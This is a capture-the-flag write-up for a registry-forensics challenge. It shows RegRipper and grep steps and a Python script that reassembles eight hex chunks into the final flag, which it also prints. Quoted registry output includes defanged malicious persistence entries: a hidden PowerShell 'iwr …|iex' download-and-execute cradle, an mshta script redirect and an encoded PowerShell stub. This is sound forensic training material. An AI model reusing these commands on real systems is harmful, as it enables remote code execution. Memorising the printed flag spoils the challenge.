@@ -1,0 +1,394 @@
+# BeyBlade writeup using Linux
+
+7z x beyblade.zip-pbeyblade # this is run in the current directory so do this for any directory by just copying the zip file to a location of your choice
+
+file beyblade
+
+# yielded:
+beyblade: MS Windows registry file, NT/2000 or above
+
+# This confirms it is a reg file, and can move forward with registry tools like rip.exe, regripper, etc
+# Now, what to do from here...
+# run regripper with -a for all plugins
+regripper -r beyblade -a > output.txt
+
+# search for flag or something first, the hint stated it was separated into chunks, so literally search for 'chunks' or similar words
+# Since challenge mentions "chunks" and "flag"
+grep -i "flag\|chunk\|piece\|part\|segment" output.txt
+
+# Or search for numbered patterns
+grep -E "[1-8].*8" output.txt
+
+# Or look for hex patterns that might be MD5 chunks
+grep -oE '[a-f0-9]{4}' output.txt | sort -u
+
+# Read through the suspicious registries:
+# Focus on autostart/persistence areas
+grep -A 5 -B 5 "Run\|Startup\|Service" output.txt
+
+# Now to put it all together
+# 1. Identify file type
+file beyblade
+
+# Step 1: Extract all URLs
+grep -a -oE 'https?://[^[:space:]"<>]+' full_output.txt
+
+# Or more permissive (catches defanged URLs too)
+grep -a -E '(http|https|ftp)://|[a-z0-9\-]+\[\.\][a-z]+' full_output.txt
+
+=================================================================================
+# Beyblade writeup for using Windows (better option here)
+# Use the Windows version of Reg Ripper (v4.0) because it was easier to find the strings associated with this attack
+# Found MITRE attack number as well, so could have followed any of the links that were displayed when searching in sublime for 'http'
+# Scrolling, and since we are working with Huntress, you can see a obvious link for https://www.huntress.com/blog/targeted-apt-activity-babyshark-is-out-for-blood
+# Clicking that link you will get a nice idea of what to look for and how to go about it
+
+# If you didn't have the download for this tool, it is in Github here:  https://github.com/keydet89/RegRipper4.0
+# Extract using 7zip and you want your own directory for this so you know where it is because it isn't something you install
+1.  Just open the application and browse for the registry file to rip, and browse and create your txt file for the output
+2.  If you have sublime text, you can scroll through it, or search for any words you may think.  One good one that would have gotten us somewhere is 'run' because this will let you know what was run at that time
+3.  Instantly you will see stuff like this:
+
+164:   wmiprvse.exe - C:\Windows\System32\wmiprvse.exe /k netsvcs -tag shard(6/8)-315a
+612  C:\Windows\System32\mmc.exe                                                      Microsoft Management Console - component#7of8-99bb
+812    Windows Update Monitor - powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # flag_value_1_of_8-47cb
+818    OneDrive Setup - cmd /c start /min mshta about:<script>location='http://telemetry.sync-live[.]net/bootstrap?stage=init&note=hash-value-2-8_5cd4'</script>
+834  r1   powershell.exe -e JABNAE0A; ## piece:4/8-b34a
+
+4.  That got us half of the way through!  So, notice these preceding:
+flag_value_1_of_8-47cb  # This means we found something here, the flag but not really in its form, but because it states 1 of 8, we can conclude that there is 8 of these and we need to string them together in order
+5.  I used Claude for obtaining a script that could evaluate this and get me the flag in this manner using a python script:
+#!/usr/bin/env python3
+"""
+Registry Flag Chunk Assembler - Advanced Version
+Intelligently tries multiple detection and assembly strategies
+"""
+
+import re
+import sys
+import subprocess
+import argparse
+from pathlib import Path
+
+def run_regripper(registry_file):
+    """Run regripper on the registry file"""
+    print(f"[+] Running regripper on {registry_file}...")
+    try:
+        result = subprocess.run(
+            ['regripper', '-r', registry_file, '-a'],
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+        if result.returncode == 0:
+            print("[+] RegRipper completed successfully")
+            return result.stdout + result.stderr
+        else:
+            print(f"[-] RegRipper failed with return code {result.returncode}")
+            return None
+    except subprocess.TimeoutExpired:
+        print("[-] RegRipper timed out")
+        return None
+    except FileNotFoundError:
+        print("[-] regripper not found. Please install it first.")
+        return None
+    except Exception as e:
+        print(f"[-] Error running regripper: {e}")
+        return None
+
+def extract_chunks_numbered(text, chunk_size=4):
+    """Extract chunks with numeric indicators (1 of 8, 2/8, etc.)"""
+    patterns = [
+        # Standard: word + number + of/slash + number + hex
+        r'(flag|hash|chunk|piece|fragment|shard|component|segment|part|token|data|value|key|section|block)[_\-\s:#]*(\d+)[_\-\s]*(?:of|/)[_\-\s]*(\d+)[_\-\s:=\)]*([a-f0-9]{' + str(chunk_size) + r'})',
+        # Compact: number/number-hex (must have hex at end)
+        r'\b(\d+)[/_\-](\d+)[_\-\s:=\)]+([a-f0-9]{' + str(chunk_size) + r'})\b',
+        # With parentheses: (6/8)
+        r'\((\d+)[/_\-](\d+)\)[_\-\s:=]+([a-f0-9]{' + str(chunk_size) + r'})',
+        # With brackets: [6/8] or [6-8]
+        r'\[(\d+)[/_\-](\d+)\][_\-\s:=]+([a-f0-9]{' + str(chunk_size) + r'})',
+    ]
+    
+    chunks = {}
+    total_chunks = None
+    
+    for pattern in patterns:
+        matches = re.finditer(pattern, text, re.IGNORECASE)
+        for match in matches:
+            groups = match.groups()
+            
+            try:
+                # Parse based on group count
+                if len(groups) == 4:  # word + num + total + hex
+                    chunk_num = int(groups[1])
+                    total = int(groups[2])
+                    hex_value = groups[3].lower()
+                elif len(groups) == 3:
+                    # Should be num + total + hex
+                    chunk_num = int(groups[0])
+                    total = int(groups[1])
+                    hex_value = groups[2].lower()
+                else:
+                    continue
+                
+                # Validate hex_value is actually hex
+                if not re.match(r'^[a-f0-9]+$', hex_value):
+                    continue
+                
+                # Validate chunk number is reasonable
+                if chunk_num < 1 or chunk_num > 100:
+                    continue
+                    
+                if total_chunks is None:
+                    total_chunks = total
+                
+                if chunk_num not in chunks:
+                    chunks[chunk_num] = hex_value
+                    
+            except (ValueError, IndexError):
+                # Skip invalid matches
+                continue
+    
+    return chunks, total_chunks
+
+def extract_chunks_lettered(text, chunk_size=4):
+    """Extract chunks with letter indicators (A, B, C or part_A, part_B)"""
+    patterns = [
+        r'(flag|hash|chunk|piece|fragment|part|section)[_\-\s:#]*([A-H])[_\-\s:=]*([a-f0-9]{' + str(chunk_size) + r'})',
+        r'\[([A-H])\][_\-\s:=]*([a-f0-9]{' + str(chunk_size) + r'})',
+    ]
+    
+    chunks = {}
+    letter_map = {'A': 1, 'B': 2, 'C': 3, 'D': 4, 'E': 5, 'F': 6, 'G': 7, 'H': 8}
+    
+    for pattern in patterns:
+        matches = re.finditer(pattern, text, re.IGNORECASE)
+        for match in matches:
+            groups = match.groups()
+            if len(groups) >= 2:
+                letter = groups[-2].upper()
+                hex_value = groups[-1].lower()
+                if letter in letter_map:
+                    chunk_num = letter_map[letter]
+                    chunks[chunk_num] = hex_value
+    
+    return chunks, len(chunks) if chunks else None
+
+def extract_chunks_sequential(text, chunk_size=4):
+    """Extract chunks that appear sequentially without explicit numbering"""
+    patterns = [
+        r'(?:chunks?|parts?|pieces?|segments?|values?)[:\s]+' + r'([a-f0-9]{' + str(chunk_size) + r'}(?:\s+[a-f0-9]{' + str(chunk_size) + r'})+)',
+    ]
+    
+    chunks = {}
+    for pattern in patterns:
+        matches = re.finditer(pattern, text, re.IGNORECASE)
+        for match in matches:
+            hex_values = re.findall(r'[a-f0-9]{' + str(chunk_size) + r'}', match.group(1))
+            for i, hex_val in enumerate(hex_values, 1):
+                chunks[i] = hex_val.lower()
+    
+    return chunks, len(chunks) if chunks else None
+
+def try_assembly_methods(chunks):
+    """Try different assembly methods and return all candidates"""
+    if not chunks:
+        return []
+    
+    candidates = []
+    sorted_keys = sorted(chunks.keys())
+    
+    # Method 1: Sequential (1,2,3,4...)
+    assembled = ''.join([chunks[k] for k in sorted_keys])
+    candidates.append({
+        'method': 'Sequential',
+        'order': sorted_keys,
+        'result': assembled
+    })
+    
+    # Method 2: Reverse (8,7,6,5...)
+    reverse_keys = sorted(chunks.keys(), reverse=True)
+    assembled = ''.join([chunks[k] for k in reverse_keys])
+    candidates.append({
+        'method': 'Reverse',
+        'order': reverse_keys,
+        'result': assembled
+    })
+    
+    # Method 3: Interleaved (1,3,5,7,2,4,6,8)
+    if len(chunks) >= 4:
+        odd_keys = [k for k in sorted_keys if k % 2 == 1]
+        even_keys = [k for k in sorted_keys if k % 2 == 0]
+        interleaved_keys = odd_keys + even_keys
+        assembled = ''.join([chunks[k] for k in interleaved_keys if k in chunks])
+        candidates.append({
+            'method': 'Interleaved (odd first)',
+            'order': interleaved_keys,
+            'result': assembled
+        })
+        
+        # Even first
+        interleaved_keys = even_keys + odd_keys
+        assembled = ''.join([chunks[k] for k in interleaved_keys if k in chunks])
+        candidates.append({
+            'method': 'Interleaved (even first)',
+            'order': interleaved_keys,
+            'result': assembled
+        })
+    
+    return candidates
+
+def verify_hash(value):
+    """Check if assembled value is valid hash"""
+    expected_lengths = {
+        'md5': 32,
+        'sha1': 40,
+        'sha256': 64
+    }
+    
+    if len(value) in expected_lengths.values() and re.match(r'^[a-f0-9]+$', value):
+        for h_type, h_len in expected_lengths.items():
+            if len(value) == h_len:
+                return True, h_type
+    
+    return False, None
+
+def smart_chunk_detection(text, chunk_size=4):
+    """Try multiple detection strategies and return best result"""
+    print("\n[+] Trying multiple chunk detection strategies...")
+    
+    strategies = [
+        ("Numbered patterns (1/8, 2 of 8, etc.)", extract_chunks_numbered),
+        ("Letter patterns (A, B, C, etc.)", extract_chunks_lettered),
+        ("Sequential patterns", extract_chunks_sequential),
+    ]
+    
+    all_results = []
+    
+    for name, strategy_func in strategies:
+        print(f"\n[*] Strategy: {name}")
+        try:
+            chunks, total = strategy_func(text, chunk_size)
+            
+            if chunks:
+                print(f"    Found {len(chunks)} chunks")
+                for num in sorted(chunks.keys()):
+                    print(f"      [{num}] {chunks[num]}")
+                
+                all_results.append({
+                    'strategy': name,
+                    'chunks': chunks,
+                    'total': total,
+                    'confidence': len(chunks) / (total if total else len(chunks))
+                })
+            else:
+                print(f"    No chunks found")
+        except Exception as e:
+            print(f"    Error: {e}")
+            continue
+    
+    # Return strategy with highest confidence
+    if all_results:
+        best = max(all_results, key=lambda x: x['confidence'])
+        print(f"\n[+] Best strategy: {best['strategy']} ({len(best['chunks'])} chunks)")
+        return best['chunks'], best['total']
+    
+    return {}, None
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='Advanced registry flag chunk assembler',
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    
+    parser.add_argument('file', help='Registry file or regripper output')
+    parser.add_argument('--size', type=int, default=4, help='Hex chunk size (default: 4)')
+    
+    args = parser.parse_args()
+    
+    print("="*70)
+    print("Registry Flag Chunk Assembler - Advanced Edition")
+    print("="*70)
+    
+    # Read input
+    if args.file.endswith('.txt'):
+        print(f"[+] Reading regripper output from {args.file}")
+        try:
+            with open(args.file, 'r', encoding='utf-8', errors='ignore') as f:
+                text = f.read()
+        except Exception as e:
+            print(f"[-] Error: {e}")
+            sys.exit(1)
+    else:
+        text = run_regripper(args.file)
+        if text is None:
+            sys.exit(1)
+        output_file = Path(args.file).stem + "_regripper_output.txt"
+        with open(output_file, 'w') as f:
+            f.write(text)
+        print(f"[+] Saved to {output_file}")
+    
+    # Smart detection
+    chunks, total_chunks = smart_chunk_detection(text, args.size)
+    
+    if not chunks:
+        print("\n[-] No chunks found")
+        sys.exit(1)
+    
+    # Try assembly methods
+    print("\n" + "="*70)
+    print("ASSEMBLY ATTEMPTS")
+    print("="*70)
+    
+    candidates = try_assembly_methods(chunks)
+    
+    valid_flags = []
+    for candidate in candidates:
+        result = candidate['result']
+        valid, hash_type = verify_hash(result)
+        
+        print(f"\n[*] Method: {candidate['method']}")
+        print(f"    Order: {candidate['order']}")
+        print(f"    Result: {result}")
+        print(f"    Length: {len(result)}")
+        
+        if valid:
+            print(f"    Status: ✓ Valid {hash_type.upper()}")
+            valid_flags.append((candidate['method'], result, hash_type))
+            print(f"    Flag: flag{{{result}}}")
+        else:
+            print(f"    Status: Not standard hash format")
+    
+    # Summary
+    if valid_flags:
+        print("\n" + "="*70)
+        print("VALID FLAGS FOUND")
+        print("="*70)
+        for method, result, hash_type in valid_flags:
+            print(f"\n[{method}]")
+            print(f"  {hash_type.upper()}: {result}")
+            print(f"  FLAG: flag{{{result}}}")
+    elif candidates:
+        print("\n" + "="*70)
+        print("MOST LIKELY FLAG")
+        print("="*70)
+        best = candidates[0]
+        print(f"\nMethod: {best['method']}")
+        print(f"Result: {best['result']}")
+        print(f"FLAG: flag{{{best['result']}}}")
+    
+    print()
+
+if __name__ == '__main__':
+    main()
+
+
+This would get you the flag instantly, but I would have like to take the time to get to know the file more, so went through it manually to find these things:
+964:   UsernameHint: administrator|segment-8-of-8=58de
+974: url2     C:\Users\Public\fragment-5_of_8-0d9c
+982:   url1 -> http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b
+
+Then manually put them in the order it states:
+flag{47cb5cd46d7bb34a0d9c315a99bb58de}
+
+TaDa!
